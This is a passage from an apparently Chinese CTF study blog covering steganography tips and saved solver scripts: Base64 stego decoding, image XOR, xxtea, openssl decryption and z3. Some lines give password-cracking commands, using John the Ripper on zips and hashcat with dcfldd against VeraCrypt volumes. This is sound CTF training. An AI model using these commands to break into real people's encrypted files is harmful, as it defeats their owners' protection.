class="hljs-number">2</span> ** -(i + <span class="hljs-number">1</span>))<br>        decimal_value += fractional_value<br><br>    key += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">round</span>(decimal_value))<br><br><span class="hljs-built_in">print</span>(key)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(out))<br></code></pre></td></tr></table></figure><ul><li>openssl解密aes密文。<code>openssl enc -aes-256-cbc -d -in flag.enc -out res -salt -iv xxx -K xxx</code></li></ul><ol start="116"><li>盲水印。分两种，一种会给两张一样的图，另一种只给一张图。例题:<a href="https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#Es84dUM2CoIAI4xGI8Ac6ugvncc">flag一分为二</a></li><li>010Editor菜单栏-&gt;工具-&gt;比较文件可以找到两个文件的不同点。另外，工具栏里还有很多其他工具，都可以试试。</li><li><a href="https://merricx.github.io/qrazybox/">QRazyBox</a>可以扫描一些其他工具扫描不出来的内容。有的时候，将纠错区涂白还能看见额外内容。例题:<a href="https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh#ZaIsdcqYOoIEmExxqMEcVopaniv">迅疾响应</a></li><li><a href="http://www.bertnase.de/npiet/npiet-execute.php">npiet</a>图片编程语言。程序大概长这样：</li></ol><p><img src="C:/Users/a1348/Desktop/NoobCTF-main/笔记/images/npiet.png" alt="npiet"></p><ol start="120"><li><a href="https://www.qsl.net/on6mu/rxsstv.htm">RX-SSTV</a>。sstv音频解密工具。</li><li><a href="https://github.com/daffainfo/ctf-writeup/tree/main/GREP%20CTF%202023/Royal%20Steg">Royal Steg</a></li></ol><ul><li>使用John the Ripper（zip2john+john）<a href="https://secnhack.in/crack-zip-files-password-using-john-the-ripper/">爆破</a>加密zip密码。</li><li>stegseek爆破steghide密码。</li></ul><ol start="122"><li><a href="https://github.com/CybercellVIIT/VishwaCTF-23_Official_Writeups/blob/main/Digital%20Forensics/DigitalForensics_CrackingTheBadVault.pdf">CrackingTheBadVault</a></li></ol><ul><li>dcfldd命令从veracrypt partition volume header中提取hashcat爆破所需的hash。一般在第一个sector，通常一个sector 512字节。<code>sudo dcfldd if=image.img of=header.tc bs=1 count=512</code></li><li>hashcat爆破Veracrypt+sha512：<code>sudo hashcat -a 3 -m 13721 &lt;hash-path&gt; &lt;word-list&gt;</code>。爆破内部隐藏partition密码（已知pim或者大致爆破范围和keyfiles）：<code>sudo hashcat -a 3 -m 13721 --veracrypt-keyfiles=key.png --veracrypt-pim-start=900 --veracrypt-pim-start=901 hidden-vol.tc &lt;word-list&gt;</code>，<code>hashcat --force --status --hash-type=13721 --veracrypt-pim-start=start --veracrypt-pim-stop=end -S -w 3 --workload-profile=&quot;2&quot; vol rockyou.txt</code></li><li>可在veracrypt volume中隐藏partition。提取隐藏partition的volume header的命令:<code>sudo dcfldd if=image.img of=hidden-vol.tc bs=1 skip=65536 count=512</code></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-MISC</category>
      
      <category>steg</category>
      
    </categories>
    
    
    <tags>
      
      <tag>steg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>脚本工具</title>
    <link href="/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/"/>
    <url>/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>首先我个脚本小子不可能写得出来，都是抄的和chatgpt大哥写的，（ε&#x3D;(´ο｀*)))唉，看不见的大手发力了！！！！！！！</p><p>为了避嫌我把原地找到了，不要来抓我，退一万步讲，，，，，哎！？你也听不到</p><p>有时候一个知道的知识点却不记得解题脚本放哪个wp里了，又懒得再写一遍。那就专门开个地方存起来。分类就不分了，有些脚本多个分区都能用。</p><h2 id="Base64隐写"><a href="#Base64隐写" class="headerlink" title="Base64隐写"></a>Base64隐写</h2><p><a href="https://zhuanlan.zhihu.com/p/349481870">来源</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64Stego_Decrypt</span>(<span class="hljs-params">LineList</span>):<br>    Base64Char = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>     <span class="hljs-comment">#Base64字符集 已按照规范排列</span><br>    BinaryText = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> LineList:<br>        <span class="hljs-keyword">if</span> line.find(<span class="hljs-string">&quot;==&quot;</span>) &gt; <span class="hljs-number">0</span>:     <span class="hljs-comment">#如果文本中有2个=符号</span><br>            temp = <span class="hljs-built_in">bin</span>(Base64Char.find(line[-<span class="hljs-number">3</span>]) &amp; <span class="hljs-number">15</span>)[<span class="hljs-number">2</span>:]      <span class="hljs-comment">#通过按位与&amp;15运算取出二进制数后4位 [2:]的作用是将0b过滤掉</span><br>            BinaryText = BinaryText+<span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">4</span>-<span class="hljs-built_in">len</span>(temp))+temp      <span class="hljs-comment">#高位补0</span><br>        <span class="hljs-keyword">elif</span> line.find(<span class="hljs-string">&quot;=&quot;</span>) &gt; <span class="hljs-number">0</span>:        <span class="hljs-comment">#如果文本中有1个=符号</span><br>            temp = <span class="hljs-built_in">bin</span>(Base64Char.find(line[-<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">3</span>)[<span class="hljs-number">2</span>:]       <span class="hljs-comment">#通过按位与&amp;3运算取出二进制数后2位</span><br>            BinaryText = BinaryText+<span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">2</span>-<span class="hljs-built_in">len</span>(temp))+temp      <span class="hljs-comment">#高位补0</span><br>    Text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">len</span>(BinaryText) % <span class="hljs-number">8</span> != <span class="hljs-number">0</span>):       <span class="hljs-comment">#最终得到的隐写数据二进制位数不一定都是8的倍数，为了避免数组越界，加上一个判断</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;警告:二进制文本位数有误，将进行不完整解析。&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(BinaryText), <span class="hljs-number">8</span>):<br>            <span class="hljs-keyword">if</span>(i+<span class="hljs-number">8</span> &gt; <span class="hljs-built_in">len</span>(BinaryText)):<br>                Text = Text+<span class="hljs-string">&quot;-&quot;</span>+BinaryText[i:]<br>                <span class="hljs-keyword">return</span> Text<br>            <span class="hljs-keyword">else</span>:<br>                Text = Text+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(BinaryText[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(BinaryText), <span class="hljs-number">8</span>):<br>            Text = Text+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(BinaryText[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))      <span class="hljs-comment">#将得到的二进制数每8位一组对照ASCII码转化字符</span><br>        <span class="hljs-keyword">return</span> Text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64_ForString_Decrypt</span>(<span class="hljs-params">Text</span>):     <span class="hljs-comment">#Base64解密</span><br>    <span class="hljs-keyword">try</span>:<br>        DecryptedText = <span class="hljs-built_in">str</span>(Text).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>        DecryptedText = base64.b64decode(DecryptedText)<br>        DecryptedText = DecryptedText.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-keyword">return</span> DecryptedText<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    Course = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;文件名:&quot;</span>)<br>    File = <span class="hljs-built_in">open</span>(Course, <span class="hljs-string">&quot;r&quot;</span>)<br>    LineList = File.read().splitlines()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;显式内容为:&quot;</span>)<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> LineList:<br>        <span class="hljs-built_in">print</span>(Base64_ForString_Decrypt(line),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n隐写内容为:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(Base64Stego_Decrypt(LineList))<br></code></pre></td></tr></table></figure><h2 id="Clemency"><a href="#Clemency" class="headerlink" title="Clemency"></a>Clemency</h2><p>Clemency是在DEFCON CTF中由LegitBS发明的架构（好家伙出个题直接创造了一个架构）。原生ida不支持此架构，下方链接提供了大佬的插件脚本。</p><p><a href="https://github.com/cseagle/ida_clemency">地址</a></p><h2 id="提取图片内像素"><a href="#提取图片内像素" class="headerlink" title="提取图片内像素"></a>提取图片内像素</h2><p>提取图片透明度值异或。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br>m1 = m2 = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-comment"># 取大图二进制</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, img.size[<span class="hljs-number">0</span>], <span class="hljs-number">19</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, img.size[<span class="hljs-number">1</span>], <span class="hljs-number">19</span>):<br>        r,g,b,a = img.getpixel((x,y))<br>        m1 += <span class="hljs-built_in">str</span>(r &amp; <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 取中间隐写图二进制</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">171</span>, <span class="hljs-number">171</span> + <span class="hljs-number">19</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">171</span>, <span class="hljs-number">171</span> + <span class="hljs-number">19</span>):<br>        r,g,b,a = img.getpixel((x,y))<br>        m2 += <span class="hljs-built_in">str</span>(a &amp; <span class="hljs-number">1</span>)<br><span class="hljs-comment"># 二进制串取异或</span><br>xor = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(A)^<span class="hljs-built_in">int</span>(B)) <span class="hljs-keyword">for</span> A,B <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(m1,m2))<br><span class="hljs-comment"># 二进制转字符串并输出</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(xor[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(xor), <span class="hljs-number">8</span>)))<br></code></pre></td></tr></table></figure><p>异或两张图片的完整rgb值，并用结果rgb值写另一张图片。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>image1 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;n1.png&#x27;</span>)<br>image2 = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;n2.png&#x27;</span>)<br><span class="hljs-built_in">print</span>(image1.mode, image2.mode)<br>size = width, height = image1.size<br>new = Image.new(<span class="hljs-string">&#x27;RGBA&#x27;</span>, size)<br>img1 = image1.load()<br>img2 = image2.load()<br>data = new.load()<br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        one = img1[x,y]<br>        two = img2[x,y]<br>        new_color = (one[<span class="hljs-number">0</span>] ^ two[<span class="hljs-number">0</span>],one[<span class="hljs-number">1</span>] ^ two[<span class="hljs-number">1</span>],one[<span class="hljs-number">2</span>] ^ two[<span class="hljs-number">2</span>])<br>        data[x,y]=new_color<br>new.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>图片像素值(rgb)本身就是字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctf.png&quot;</span>)<br>pixels = img.load()<br>msg = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">1</span>]):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(img.size[<span class="hljs-number">0</span>]):<br>        msg += <span class="hljs-built_in">bytes</span>(pixels[x, y])<br><span class="hljs-built_in">print</span>(msg.decode())<br></code></pre></td></tr></table></figure><h2 id="词频统计"><a href="#词频统计" class="headerlink" title="词频统计"></a>词频统计</h2><p>统计单词出现的次数就比较麻烦，需要自己构建字典。比如这道题：<a href="https://www.cnblogs.com/Konmu/p/12527029.html">浪里淘沙</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ctf.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>data=f.read()<br>f.close()<br>statistics=&#123;&#125;<br>frequency=[]<br>num=[<span class="hljs-number">4</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">zipin</span>(<span class="hljs-params">lsit</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> lsit:<br>        statistics.setdefault(data.count(i),<span class="hljs-built_in">str</span>(i))<br>        frequency.append(data.count(i))<br>    frequency.sort()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> num:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(statistics.get(frequency[i-<span class="hljs-number">1</span>])),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-keyword">return</span>(statistics)<br><br>letters=[]<br><span class="hljs-built_in">print</span>(zipin(letters))<br></code></pre></td></tr></table></figure><h2 id="xxtea"><a href="#xxtea" class="headerlink" title="xxtea"></a>xxtea</h2><p>解密与加密脚本的python实现。<a href="https://www.cnblogs.com/DirWang/p/12198526.html">来源</a>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>_DELTA = <span class="hljs-number">0x9E3779B9</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_long2str</span>(<span class="hljs-params">v, w</span>):<br>    n = (<span class="hljs-built_in">len</span>(v) - <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> w:<br>        m = v[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> (m &lt; n - <span class="hljs-number">3</span>) <span class="hljs-keyword">or</span> (m &gt; n): <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span><br>        n = m<br>    s = struct.pack(<span class="hljs-string">&#x27;&lt;%iL&#x27;</span> % <span class="hljs-built_in">len</span>(v), *v)<br>    <span class="hljs-keyword">return</span> s[<span class="hljs-number">0</span>:n] <span class="hljs-keyword">if</span> w <span class="hljs-keyword">else</span> s<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_str2long</span>(<span class="hljs-params">s, w</span>):<br>    n = <span class="hljs-built_in">len</span>(s)<br>    m = (<span class="hljs-number">4</span> - (n &amp; <span class="hljs-number">3</span>) &amp; <span class="hljs-number">3</span>) + n<br>    s = s.ljust(m, <span class="hljs-string">b&quot;\0&quot;</span>)<br>    v = <span class="hljs-built_in">list</span>(struct.unpack(<span class="hljs-string">&#x27;&lt;%iL&#x27;</span> % (m &gt;&gt; <span class="hljs-number">2</span>), s))<br>    <span class="hljs-keyword">if</span> w: v.append(n)<br>    <span class="hljs-keyword">return</span> v<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, key</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> == <span class="hljs-string">&#x27;&#x27;</span>: <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br>    v = _str2long(<span class="hljs-built_in">str</span>, <span class="hljs-literal">True</span>)<br>    k = _str2long(key.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">b&quot;\0&quot;</span>), <span class="hljs-literal">False</span>)<br>    n = <span class="hljs-built_in">len</span>(v) - <span class="hljs-number">1</span><br>    z = v[n]<br>    y = v[<span class="hljs-number">0</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // (n + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> q &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> + _DELTA) &amp; <span class="hljs-number">0xffffffff</span><br>        e = <span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span>  <span class="hljs-built_in">range</span>(n):<br>            y = v[p + <span class="hljs-number">1</span>]<br>            v[p] = (v[p] + ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[p &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>            z = v[p]<br>        y = v[<span class="hljs-number">0</span>]<br>        v[n] = (v[n] + ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[n &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>        z = v[n]<br>        q -= <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> _long2str(v, <span class="hljs-literal">False</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, key</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span> == <span class="hljs-string">&#x27;&#x27;</span>: <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br>    v = _str2long(<span class="hljs-built_in">str</span>, <span class="hljs-literal">False</span>)<br>    k = _str2long(key.ljust(<span class="hljs-number">16</span>, <span class="hljs-string">b&quot;\0&quot;</span>), <span class="hljs-literal">False</span>)<br>    n = <span class="hljs-built_in">len</span>(v) - <span class="hljs-number">1</span><br>    z = v[n]<br>    y = v[<span class="hljs-number">0</span>]<br>    q = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // (n + <span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">sum</span> = (q * _DELTA) &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-built_in">sum</span> != <span class="hljs-number">0</span>):<br>        e = <span class="hljs-built_in">sum</span> &gt;&gt; <span class="hljs-number">2</span> &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = v[p - <span class="hljs-number">1</span>]<br>            v[p] = (v[p] - ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[p &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>            y = v[p]<br>        z = v[n]<br>        v[<span class="hljs-number">0</span>] = (v[<span class="hljs-number">0</span>] - ((z &gt;&gt; <span class="hljs-number">5</span> ^ y &lt;&lt; <span class="hljs-number">2</span>) + (y &gt;&gt; <span class="hljs-number">3</span> ^ z &lt;&lt; <span class="hljs-number">4</span>) ^ (<span class="hljs-built_in">sum</span> ^ y) + (k[<span class="hljs-number">0</span> &amp; <span class="hljs-number">3</span> ^ e] ^ z))) &amp; <span class="hljs-number">0xffffffff</span><br>        y = v[<span class="hljs-number">0</span>]<br>        <span class="hljs-built_in">sum</span> = (<span class="hljs-built_in">sum</span> - _DELTA) &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">return</span> _long2str(v, <span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h2 id="openssl解密"><a href="#openssl解密" class="headerlink" title="openssl解密"></a>openssl解密</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><ul><li>openssl rsautl -decrypt -inkey privatekey.key -in cipher.enc -out result</li></ul><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><ul><li>openssl enc -d -aes-128-cbc -md md5 -pass pass:SevenPinLock0123456 -in flag.aes128cbc</li><li>openssl enc -aes-256-cbc -d -in flag.enc -out res -salt -iv xxx -K xxx</li></ul><h3 id="CSR文件"><a href="#CSR文件" class="headerlink" title="CSR文件"></a>CSR文件</h3><ul><li>openssl req -in file.csr -noout -text</li></ul><h2 id="openssl私钥格式"><a href="#openssl私钥格式" class="headerlink" title="openssl私钥格式"></a>openssl私钥格式</h2><p>头和尾分别需要包含这两行：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">-----BEGIN RSA <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br>-----<span class="hljs-keyword">END</span> RSA <span class="hljs-keyword">PRIVATE</span> <span class="hljs-keyword">KEY</span>-----<br></code></pre></td></tr></table></figure><h2 id="批量openssl解密并合并图片"><a href="#批量openssl解密并合并图片" class="headerlink" title="批量openssl解密并合并图片"></a>批量openssl解密并合并图片</h2><p>例题：<a href="https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/6%E7%BA%A7/Misc/Mysterious-GIF.md">Mysterious-GIF</a></p><h2 id="uncompyle6反编译pyc"><a href="#uncompyle6反编译pyc" class="headerlink" title="uncompyle6反编译pyc"></a>uncompyle6反编译pyc</h2><ul><li>uncompyle6 -o result.py ctf.pyc</li><li>uncompyle6的一个fork，可处理一些uncompyle6无法反编译的高版本pyc： <a href="https://github.com/rocky/python-decompile3">https://github.com/rocky/python-decompile3</a></li></ul><h2 id="读取两个文件内容并xor"><a href="#读取两个文件内容并xor" class="headerlink" title="读取两个文件内容并xor"></a>读取两个文件内容并xor</h2><p>要求两个文件内容长度一致。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.strxor <span class="hljs-keyword">import</span> strxor<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data1=f.read()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;b.txt&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data2=f.read()<br><span class="hljs-built_in">print</span>(strxor(data1.encode(),data2.encode()))<br></code></pre></td></tr></table></figure><h2 id="简单z3使用"><a href="#简单z3使用" class="headerlink" title="简单z3使用"></a>简单z3使用</h2><p>z3默认只会给出一个解，如果想要全部的解可以像下面这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#https://stackoverflow.com/questions/13395391/z3-finding-all-satisfying-models</span><br><span class="hljs-keyword">while</span> s.check() == z3.sat:  <br>    solution = <span class="hljs-string">&quot;False&quot;</span><br>    m = s.model()<br>    <span 